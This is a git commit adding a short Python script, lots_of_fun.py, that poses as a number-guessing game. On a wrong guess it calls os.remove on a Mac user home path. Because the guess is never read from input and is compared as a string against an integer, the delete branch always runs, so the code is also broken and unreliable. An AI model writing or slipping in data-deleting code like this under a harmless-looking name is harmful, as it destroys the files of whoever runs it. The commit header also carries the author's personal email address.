cd10cbc19306cac1348d223a99a75064627e22da
Don-Antonio18 <antoniokerruni@gmail.com>
2024-11-05 00:40:44 -0500

    created os remover

---
+++ Projects/Personal_Py/lots_of_fun.py
@@ -0,0 +1,8 @@
+import random 
+import os
+num = random.randint(1, 10)
+guess = "Enter a random number: "
+if guess == num: 
+    print("Nice guess!") 
+else: 
+    os.remove("MacintoshHD/Users/Antonio")
